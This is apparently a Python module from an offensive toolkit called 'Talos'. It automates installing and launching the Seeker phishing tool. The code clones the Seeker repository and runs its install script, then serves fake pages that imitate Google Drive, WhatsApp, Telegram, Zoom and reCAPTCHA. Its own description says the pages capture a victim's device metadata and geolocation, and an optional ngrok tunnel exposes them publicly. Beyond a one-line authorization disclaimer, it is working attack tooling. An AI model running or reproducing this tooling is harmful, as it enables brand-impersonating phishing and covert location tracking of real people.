"""Seeker integration module for Talos.

The module bootstraps the external Seeker project into the workspace when it is
missing, validates the required runtime dependencies, launches the local fake
page server and returns the generated public/local URL as structured output.

The implementation intentionally mirrors the rest of the Talos framework:
``NAME`` / ``DESCRIPTION`` / ``validate_environment()`` / ``run(context)`` are
all present, every failure is converted into a :class:`ToolResult`, and every
major stage reports progress through :meth:`BaseModule.report_progress`.
"""
from __future__ import annotations

import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

from src.errors.registry import ErrorCategory, ToolError
from src.models.tool_result import ToolResult
from src.orchestrator import BaseModule

_DEFAULT_SEEKER_PATH = os.path.join("external_tools", "seeker", "seeker.py")
_DEFAULT_TEMPLATE = "NearYou"
_DEFAULT_PORT = 8080
_DEFAULT_TIMEOUT = 60.0


def _project_root() -> str:
    """Return the Talos project root directory."""
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _resolve_seeker_path() -> str:
    """Resolve the Seeker Python entry-point, honouring the SEEKER_PATH env var."""
    env_path = (os.environ.get("SEEKER_PATH") or "").strip()
    if env_path:
        candidate = env_path
        if not os.path.isabs(candidate):
            candidate = os.path.normpath(os.path.join(_project_root(), candidate))
        return candidate
    return os.path.normpath(os.path.join(_project_root(), _DEFAULT_SEEKER_PATH))


def _template_index(name: str) -> int:
    """Map a Talos-friendly Seeker template name to the upstream numeric index."""
    aliases = {
        "nearyou": 0,
        "google drive": 1,
        "google-drive": 1,
        "whatsapp": 2,
        "telegram": 4,
        "zoom": 5,
        "google recaptcha": 6,
        "google-recaptcha": 6,
        "captcha": 6,
    }
    key = (name or "").strip().lower()
    if key in aliases:
        return aliases[key]
    return 0


def _extract_link(output: str) -> Optional[str]:
    """Extract the first usable HTTP(S) URL from Seeker output.

    We intentionally ignore brand/social metadata URLs such as the upstream
    Twitter profile link, because Talos is meant to present the actual local or
    public phishing page endpoint rather than the upstream project's branding.
    """
    if not output:
        return None
    for match in re.finditer(r"https?://[^\s\"'<>]+", output, flags=re.IGNORECASE):
        candidate = match.group(0).rstrip("),.;")
        if candidate.endswith("'"):
            candidate = candidate[:-1]
        hostname = re.sub(r"^https?://", "", candidate, flags=re.IGNORECASE)
        hostname = hostname.split("/", 1)[0].lower()
        if hostname in {"twitter.com", "x.com", "twc1rcle.com"}:
            continue
        return candidate
    return None


def _build_local_urls(port: int) -> List[str]:
    """Return a list of suitable local/private URLs for the given port."""
    urls: List[str] = [f"http://127.0.0.1:{port}"]
    for ip in _lan_ips():
        candidate = f"http://{ip}:{port}"
        if candidate not in urls:
            urls.append(candidate)
    return urls


def _run_command(command: List[str], *, timeout: float, cwd: Optional[str] = None) -> Tuple[int, str, str]:
    """Execute a subprocess and return code, stdout and stderr."""
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        timeout=timeout,
        cwd=cwd,
        check=False,
    )
    return completed.returncode, completed.stdout, completed.stderr


class SeekerModule(BaseModule):
    """Install and launch the external Seeker phishing page generator."""

    NAME = "seeker"
    DESCRIPTION = (
        "Install and launch Seeker to generate a phishing URL that captures device "
        "metadata and geolocation when a victim visits it."
    )

    @classmethod
    def validate_environment(cls) -> None:
        """Ensure the Seeker project exists and its runtime dependencies are ready."""
        seeker_path = _resolve_seeker_path()
        seeker_dir = os.path.dirname(seeker_path) if seeker_path else None

        if not os.path.isfile(seeker_path):
            cls._install_seeker(seeker_path)

        if shutil.which("php") is None:
            raise ToolError(
                "PHP is not installed. Seeker requires PHP to serve the fake pages.",
                category=ErrorCategory.MISSING,
                module=cls.NAME,
            )

        cls._ensure_python_dependencies()

        if not os.path.isfile(seeker_path):
            raise ToolError(
                f"Seeker entry point was not created at {seeker_path!r}.",
                category=ErrorCategory.MISSING,
                module=cls.NAME,
            )

    @classmethod
    def _install_seeker(cls, seeker_path: str) -> None:
        """Clone Seeker into the Talos workspace and run its install script."""
        seeker_dir = os.path.dirname(seeker_path)
        if seeker_dir:
            os.makedirs(seeker_dir, exist_ok=True)

        if shutil.which("git") is None:
            raise ToolError(
                "git is not installed. Talos cannot clone the Seeker repository.",
                category=ErrorCategory.MISSING,
                module=cls.NAME,
            )

        repo_url = "https://github.com/thewhiteh4t/seeker.git"
        clone_cmd = ["git", "clone", "--depth", "1", repo_url, seeker_dir]
        try:
            code, stdout, stderr = _run_command(clone_cmd, timeout=180.0, cwd=_project_root())
        except subprocess.TimeoutExpired as exc:
            raise ToolError(
                f"Timed out while cloning Seeker: {exc}",
                category=ErrorCategory.TIMEOUT,
                module=cls.NAME,
                cause=exc,
            ) from exc

        if code != 0:
            raise ToolError(
                f"Failed to clone Seeker from {repo_url}: {stderr or stdout}",
                category=ErrorCategory.RESOURCE,
                module=cls.NAME,
            )

        install_script = os.path.join(seeker_dir, "install.sh")
        if not os.path.isfile(install_script):
            raise ToolError(
                f"Seeker clone succeeded but the install script is missing at {install_script!r}.",
                category=ErrorCategory.MISSING,
                module=cls.NAME,
            )

        try:
            code, stdout, stderr = _run_command(["bash", install_script], timeout=300.0, cwd=seeker_dir)
        except subprocess.TimeoutExpired as exc:
            raise ToolError(
                f"Timed out while running Seeker install script: {exc}",
                category=ErrorCategory.TIMEOUT,
                module=cls.NAME,
                cause=exc,
            ) from exc

        if code != 0:
            msg = stderr.strip() or stdout.strip() or "Seeker install script exited with a failure code."
            raise ToolError(
                f"Failed to install Seeker: {msg}",
                category=ErrorCategory.MISSING,
                module=cls.NAME,
            )

    @staticmethod
    def _ensure_python_dependencies() -> None:
        """Ensure the Python packages Seeker depends on are available."""
        python_executable = sys.executable or "python3"
        check_cmd = [
            python_executable,
            "-c",
            "import requests, packaging, psutil; print('ok')",
        ]
        try:
            code, stdout, stderr = _run_command(check_cmd, timeout=30.0)
        except subprocess.TimeoutExpired as exc:
            raise ToolError(
                f"Timed out while checking Python dependencies: {exc}",
                category=ErrorCategory.TIMEOUT,
                module="seeker",
                cause=exc,
            ) from exc

        if code == 0:
            return

        install_cmd = [
            python_executable,
            "-m",
            "pip",
            "install",
            "requests",
            "packaging",
            "psutil",
        ]
        try:
            code, stdout, stderr = _run_command(install_cmd, timeout=300.0)
        except subprocess.TimeoutExpired as exc:
            raise ToolError(
                f"Timed out while installing Seeker dependencies: {exc}",
                category=ErrorCategory.TIMEOUT,
                module="seeker",
                cause=exc,
            ) from exc

        if code != 0:
            msg = stderr.strip() or stdout.strip() or "pip install failed."
            raise ToolError(
                f"Failed to install Seeker Python dependencies: {msg}",
                category=ErrorCategory.MISSING,
                module="seeker",
            )

    def run(self, context: Dict[str, Any]) -> ToolResult:
        """Start Seeker as a Talos wrapper in a separate terminal window.

        Talos does not embed or own the server runtime; it launches the real
        Seeker tool in its own terminal and exposes the local/private URL plus
        any public/tunnel URL in the Talos console. This keeps the wrapper
        lightweight and avoids waiting forever on the Seeker process itself.
        """
        start = time.perf_counter()
        try:
            self.validate_environment()
        except ToolError as exc:
            return ToolResult.from_tool_error(self.NAME, exc, duration_ms=_elapsed_ms(start))

        options = dict(context.get("options") or {})
        template = str(
            options.get("template")
            or os.environ.get("SEEKER_DEFAULT_TEMPLATE", _DEFAULT_TEMPLATE)
            or _DEFAULT_TEMPLATE
        )
        port = int(
            options.get("port")
            or os.environ.get("SEEKER_DEFAULT_PORT", _DEFAULT_PORT)
            or _DEFAULT_PORT
        )
        tunnel = bool(options.get("tunnel", False))
        timeout = float(
            options.get("timeout")
            or os.environ.get("SEEKER_TIMEOUT", _DEFAULT_TIMEOUT)
            or _DEFAULT_TIMEOUT
        )

        seeker_path = _resolve_seeker_path()
        if not os.path.isfile(seeker_path):
            return ToolResult.failed(
                self.NAME,
                f"Seeker script not found at {seeker_path!r}.",
                category=ErrorCategory.MISSING,
                duration_ms=_elapsed_ms(start),
            )

        template_index = _template_index(template)
        cmd: List[str] = [sys.executable, seeker_path, "-t", str(template_index), "-p", str(port)]

        self.report_progress(f"launching Seeker for template '{template}' on port {port}", 0.2)
        self.report_progress("Seeker is starting in its own terminal", None)

        print(f"[INFO] Talos wrapper: starting Seeker template={template} port={port}")
        print(f"[INFO] Local/private URL: http://127.0.0.1:{port}")
        for url in _build_local_urls(port)[1:]:
            print(f"[INFO] Local network URL: {url}")
        public_ip = _public_ip()
        if public_ip:
            print(f"[INFO] Public internet IP: {public_ip}")
        else:
            print("[INFO] Public internet IP could not be detected; no outbound route or service response.")
        if tunnel:
            print("[INFO] Tunnel mode enabled — the public URL will appear in the Seeker terminal when it is available.")
        print(f"[INFO] Closing the Seeker terminal will stop the hosting process on port {port}.")

        if sys.stdin.isatty() and sys.stdout.isatty():
            ok, detail = _spawn_server_terminal(cmd, cwd=os.path.dirname(seeker_path))
            if not ok:
                return ToolResult.failed(
                    self.NAME,
                    f"failed to open a terminal window: {detail}",
                    category=ErrorCategory.RESOURCE,
                    duration_ms=_elapsed_ms(start),
                )
            if not _wait_for_server(port, timeout=10.0):
                return ToolResult.failed(
                    self.NAME,
                    f"Seeker exited or did not start listening on port {port}.",
                    category=ErrorCategory.RESOURCE,
                    duration_ms=_elapsed_ms(start),
                )
        else:
            subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                cwd=os.path.dirname(seeker_path),
                start_new_session=True,
            )
            if not _wait_for_server(port, timeout=10.0):
                return ToolResult.failed(
                    self.NAME,
                    f"Seeker exited or did not start listening on port {port}.",
                    category=ErrorCategory.RESOURCE,
                    duration_ms=_elapsed_ms(start),
                )

        print("[INFO] Browser tip: use 127.0.0.1 or your LAN IP; do not use 0.0.0.0 as a client URL.")
        print("[INFO] If the page still times out, the server has not finished binding yet or a firewall/NAT rule is blocking access.")

        local_url = f"http://127.0.0.1:{port}"
        urls = _build_local_urls(port)
        payload: Dict[str, Any] = {
            "link": local_url,
            "local_url": local_url,
            "private_urls": urls,
            "template": template,
            "port": port,
            "tunnel": tunnel,
        }
        if public_ip:
            payload["public_ip"] = public_ip
        context.setdefault("results", {})[self.NAME] = payload
        self.report_progress("Seeker launched in a dedicated terminal", 1.0)
        return ToolResult.success(
            self.NAME,
            data=payload,
            raw_stdout="",
            raw_stderr="",
            duration_ms=_elapsed_ms(start),
        )


def _public_ip() -> Optional[str]:
    """Attempt to discover this host's public IPv4 address."""
    sources = ("https://api.ipify.org", "https://ifconfig.me/ip")
    for url in sources:
        try:
            with urllib.request.urlopen(url, timeout=5) as response:
                text = response.read().decode("utf-8", errors="replace").strip()
            if re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", text):
                return text
        except Exception:
            continue
    return None


def _lan_ips() -> List[str]:
    """Return the configured private IPv4 addresses for this machine."""
    seen: List[str] = []
    try:
        for family, _, _, _, sockaddr in socket.getaddrinfo(
            socket.gethostname(),
            None,
            type=socket.SOCK_STREAM,
        ):
            if family != socket.AF_INET:
                continue
            host = sockaddr[0]
            if host and host not in seen and host.startswith(("10.", "172.", "192.168.")):
                seen.append(host)
    except Exception:
        pass
    if seen:
        return seen

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 53))
            candidate = sock.getsockname()[0]
        if candidate and candidate not in seen:
            seen.append(candidate)
    except Exception:
        pass
    return seen


def _port_available(port: int) -> bool:
    """True when nothing is listening on 0.0.0.0:<port> right now."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind(("0.0.0.0", port))
        return True
    except OSError:
        return False


def _script_path() -> str:
    """Absolute path to the standalone Seeker runner."""
    return os.path.join(_project_root(), "scripts", "seeker.py")


def _server_argv(port: int, template: str, tunnel: bool, timeout: float) -> List[str]:
    """Build the argv the hosting terminal runs."""
    argv = [
        sys.executable,
        _script_path(),
        "--template",
        template,
        "--port",
        str(port),
        "--timeout",
        str(timeout),
        "--terminal-child",
    ]
    if tunnel:
        argv.append("--tunnel")
    return argv


def _spawn_server_terminal(argv: List[str], *, cwd: str) -> Tuple[bool, str]:
    """Open a new terminal window running the Seeker hosting process.

    The terminal is launched in a way that keeps it open after the process exits
    so the user can see the Seeker logs and the generated URLs until they close
    the window manually.
    """
    try:
        if os.name == "nt":
            subprocess.Popen(
                f'start "TALOS Seeker" cmd /k {subprocess.list2cmdline(argv)}',
                shell=True,
            )
            return True, ""
        if sys.platform == "darwin":
            inner = " ".join(shlex.quote(part).replace('"', '\\"') for part in argv)
            subprocess.Popen(
                [
                    "osascript",
                    "-e",
                    f'tell app "Terminal" to do script "{inner}; echo \"Press ENTER to close\"; read _"',
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            return True, ""

        shell_wait = f"cd {shlex.quote(cwd)} && "
        shell_wait += " ".join(shlex.quote(part) for part in argv)
        shell_wait += "; echo 'Press ENTER to close this window'; read -r _"

        linux_openers = [
            ["konsole", "--hold", "--workdir", cwd, "--title", "Talos Seeker Console", "-e", "bash", "-lc", shell_wait],
            ["xfce4-terminal", "--hold", "--working-directory", cwd, "-e", *argv],
            ["xterm", "-hold", "-e", "bash", "-lc", shell_wait],
            ["gnome-terminal", "--", "bash", "-lc", shell_wait],
        ]
        for opener in linux_openers:
            try:
                subprocess.Popen(
                    opener,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                return True, ""
            except OSError:
                continue
        return False, "no terminal emulator found (tried konsole, xfce4-terminal, xterm, gnome-terminal)"
    except OSError as exc:
        return False, f"could not open a terminal window: {exc}"


def _wait_for_server(port: int, timeout: float = 10.0) -> bool:
    """Poll the local Seeker server and report whether it started."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=0.8) as response:
                if response.status in (200, 301, 302, 403, 404):
                    return True
        except Exception:
            time.sleep(0.25)
    return False


def _ask(prompt: str, default: Optional[str] = None) -> str:
    """Prompt the user for a value, defaulting safely when input is unavailable."""
    suffix = f" [{default}]" if default is not None else ""
    try:
        return input(f"  {prompt}{suffix}: ").strip() or (default or "")
    except EOFError:
        return default or ""


def _yn(value: str) -> bool:
    return value.strip().lower() in ("y", "yes", "1", "true", "on")


def menu_seeker(session: Any) -> None:
    """CLI wrapper: configure Seeker, open a dedicated terminal window and link it to the session."""
    print("  TALOS Seeker hosting module")
    print("  This launches a fake page in a new terminal window. The window shows")
    print("  live Seeker output, the local/private URL and the public URL when")
    print("  available. Closing that terminal stops the hosting process.")
    print("  Use only on systems you own or have explicit authorization to test.")
    print()

    template = _ask("Template", "NearYou")
    port_text = _ask("Listen port", str(_DEFAULT_PORT))
    tunnel = _ask("Expose via ngrok / public tunnel [y/n]", "n")
    timeout_text = _ask("Wait timeout (seconds)", str(_DEFAULT_TIMEOUT))

    try:
        port = int(port_text)
        timeout = float(timeout_text)
    except ValueError:
        print("[x] Invalid port or timeout value.")
        return

    if port <= 0 or port > 65535:
        print("[x] Port must be between 1 and 65535.")
        return
    if not _port_available(port):
        print(f"[x] Port {port} is already in use — choose another port.")
        return

    argv = _server_argv(port, template, _yn(tunnel), timeout)

    if not (sys.stdin.isatty() and sys.stdout.isatty()):
        print("[WARN] Not an interactive terminal — no new window was opened. Run manually:")
        print("  " + " ".join(argv))
        return

    ok, detail = _spawn_server_terminal(argv, cwd=os.path.dirname(_resolve_seeker_path()))
    if not ok:
        print(f"[x] {detail}")
        print("  Run it manually: " + " ".join(argv))
        return

    print("[OK] Seeker started in a new terminal window.")
    lan_ips = _lan_ips()
    public_ip = _public_ip()
    if lan_ips:
        print(f"[INFO] Private / local URL: http://{lan_ips[0]}:{port}")
        for ip in lan_ips[1:]:
            print(f"[INFO] Local network URL: http://{ip}:{port}")
    else:
        print(f"[INFO] Local URL: http://127.0.0.1:{port}")
    if public_ip:
        print(f"[INFO] Public internet IP: {public_ip}")
    else:
        print("[INFO] Public internet IP could not be detected; no outbound route or service response.")
    if _yn(tunnel):
        print("[INFO] Tunnel mode enabled — ngrok/public URL will appear in the Seeker terminal output.")
    print("[INFO] Close the Seeker terminal window to stop the hosting process.")
    if not _wait_for_server(port):
        print(f"[x] Seeker did not start listening on port {port}.")
        print("  Check the Seeker terminal for the startup error, then close it.")
        return
    if lan_ips:
        print(f"[INFO] Host is now available on the network at http://{lan_ips[0]}:{port}")
    else:
        print(f"[INFO] Host is now available at http://127.0.0.1:{port}")


def _elapsed_ms(start: float) -> float:
    """Return elapsed milliseconds since a monotonic start time."""
    return (time.perf_counter() - start) * 1000.0
